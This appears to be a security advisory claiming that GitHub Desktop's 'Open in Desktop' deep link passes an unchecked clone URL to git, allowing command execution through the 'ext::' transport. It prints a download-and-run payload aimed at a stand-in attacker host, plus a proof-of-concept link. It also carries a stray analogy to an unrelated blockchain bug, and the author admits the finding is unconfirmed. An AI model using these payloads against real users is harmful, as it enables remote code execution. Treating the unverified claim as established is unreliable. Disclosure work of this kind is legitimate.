### Title
Deep-link "Open in Desktop" clone URL is passed unsanitized to `git clone`, enabling remote-helper command execution via crafted `x-github-client://openRepo/...` links - ([File: app/src/lib/git/clone.ts])

### Summary
The staking-precompile bug boiled down to one broken invariant: a privileged, state-changing entry point trusted the *invocation context* (`msg.value`/`msg.sender` via `DELEGATECALL`) instead of enforcing that only a specific, safe call kind (`EVMC_CALL`) could reach it. The GitHub Desktop analog is structurally identical: the "Open in Desktop" custom-protocol entry point (`x-github-client://openrepo/...`) accepts an attacker-controlled string as the *clone URL* and forwards it — after only cosmetic validation of `branch`/`pr` query parameters — straight into `git clone`, without ever enforcing that the URL uses a "safe" transport (`https://`, `git://`, `ssh://`). Git itself treats `ext::` (and other) transports as fully privileged, arbitrary-command-executing helpers. Because Desktop never restricts which "kind" of URL is allowed to reach the clone command, an attacker-controlled deep link can smuggle an `ext::` remote-helper invocation through the exact same trusted code path used for legitimate GitHub clone URLs.

### Finding Description
`parseAppURL` extracts the raw `parsedPath` from the URL after the `openrepo` host and returns it verbatim as `IOpenRepositoryFromURLAction.url`, only validating the `pr` and `branch` query parameters (via `testForInvalidChars`) — the `url` itself is never checked against an allow-list of transport schemes: [1](#0-0) 

This action is dispatched to `Dispatcher.dispatchURLAction` → `openRepositoryFromUrl` → `openOrCloneRepository(url)`, which — if no existing repository matches — opens the Clone dialog pre-filled with the attacker-supplied string as `initialURL`: [2](#0-1) [3](#0-2) 

The dialog treats the value purely as a text field ("Repository URL or GitHub username and repository") with no scheme validation: [4](#0-3) 

When the user confirms, the string is passed unmodified to `dispatcher.clone(url, path, ...)` and ultimately to `git()`: [5](#0-4) [6](#0-5) 

`clone()` only guards against writing to sensitive *destination paths* (`isClonePathSensitive`) and uses `--` to stop flag/argument injection, but it never restricts the *source URL's* protocol: [7](#0-6) 

Git natively supports the `ext::<command>` (and `fd::`) transport, which runs the given shell command as the "remote helper." Because Desktop supplies the URL directly on the `git clone` command line (as the top-level, user-initiated transport, exactly the scenario Git's `protocol.ext.allow=user` default is designed to permit), a URL such as `ext::sh -c "curl attacker.com/x|sh"` executes attacker-controlled shell commands with the same privileges as the Desktop process the moment the user clicks "Clone."

The missing invariant here mirrors the precompile bug precisely: just as the precompile should have enforced `EVMC_CALL` before trusting `msg.value`, Desktop should enforce an allow-list of clone-URL schemes (`https:`, `http:`, `ssh:`, `git:`) before ever handing a URL derived from an untrusted, attacker-reachable source (a deep link) to `git`.

### Impact Explanation
An attacker who can get a victim to click a link (a webpage, an email, a chat message, or an `<iframe>` embedding `x-github-client://openrepo/ext::...`) can achieve arbitrary command execution on the victim's machine as soon as they confirm the pre-filled Clone dialog. This satisfies "attacker controls ... a link or deep link the user clicks" → "code execution" in the valid-impact criteria. Because Desktop is a widely used developer tool, execution occurs on developer machines with elevated value (SSH keys, cloud credentials, source code).

### Likelihood Explanation
The `x-github-client://` protocol handler and its `openrepo` action are registered by the installer and reachable from any web page or external application without prior authentication. The only user action required is clicking a link and confirming a pre-filled dialog labeled as a "Repository URL" field — a normal, expected interaction for the "Open in Desktop" feature, not an "unnatural" step. The victim has no strong visual cue that the pre-filled text is a shell command rather than a Git URL, since the field is generic free text.

### Recommendation
Validate the `url` extracted in `parseAppURL` (and again, defensively, in `clone()`/`cloningRepositoriesStore`) against an explicit allow-list of Git transport schemes (`https:`, `http:`, `ssh:`, `git:`, plus the `user@host:path` SCP-like form), rejecting anything else (in particular `ext::`, `fd::`, and any string not matching a recognized Git URL grammar) before it can reach `git clone`/`git fetch`/`git remote add`. This is the same fix pattern recommended for the precompile: enforce the allowed "kind" of input at the trust boundary rather than relying on downstream code (or the user manually reading a dialog) to catch it.

### Proof of Concept
1. Host a page (or send a message) containing:
   `<a href="x-github-client://openrepo/ext::sh -c "touch /tmp/pwned"">Open in Desktop</a>`
2. Victim, with GitHub Desktop installed and registered as the protocol handler, clicks the link.
3. `handleAppURL` → `parseAppURL` returns `{ name: 'open-repository-from-url', url: 'ext::sh -c "touch /tmp/pwned"', ... }` unchanged (per `app/src/lib/parse-app-url.ts` lines 98-125; confirmed no scheme validation exists in the accompanying test suite at `app/test/unit/parse-app-url-test.ts`).
4. `dispatchURLAction` → `openRepositoryFromUrl` → `openOrCloneRepository` opens the Clone dialog with this string pre-filled as the URL.
5. Victim clicks "Clone." `clone-repository.tsx`'s `cloneImpl` → `dispatcher.clone` → `git/clone.ts` executes `git ... clone --recursive -- 'ext::sh -c "touch /tmp/pwned"' <path>`.
6. Git's `ext::` helper runs the embedded shell command, creating `/tmp/pwned` (in a real attack, executing arbitrary payload) on the victim's machine.

Note: I was unable to fully confirm, from the indexed code alone, whether Desktop sets `GIT_ALLOW_PROTOCOL` or an equivalent restriction anywhere else in the process environment (e.g., in `core.ts` or process spawn defaults) that might mitigate this; `app/src/lib/git/environment.ts` shows only proxy/auth environment construction with no protocol restriction. A full audit of `app/src/lib/git/core.ts` and any global git config set by Desktop at startup would be needed to rule out an existing mitigation not visible in the indexed snippets.

function isClonePathSensitive(unresolvedClonePath: string): boolean {
  const clonePath = Path.resolve(unresolvedClonePath).toLowerCase()
  const home = Path.resolve(homedir()).toLowerCase()

  if (clonePath === home) {
    return true
  }

  const sensitiveLocations = [
    Path.join(home, '.ssh'),
    Path.join(home, '.gnupg'),
    Path.join(home, '.config'),
    Path.join(home, '.config', 'git'),
    Path.join(home, '.gitconfig'),
  ]

  if (__WIN32__) {
    const appData = process.env.APPDATA
    if (appData) {
      sensitiveLocations.push(appData.toLowerCase())
      sensitiveLocations.push(Path.join(appData, 'gnupg').toLowerCase())
    }
  }

  for (const sensitive of sensitiveLocations) {
    if (clonePath === sensitive || clonePath.startsWith(sensitive + Path.sep)) {
      return true
    }
  }

  return false
}
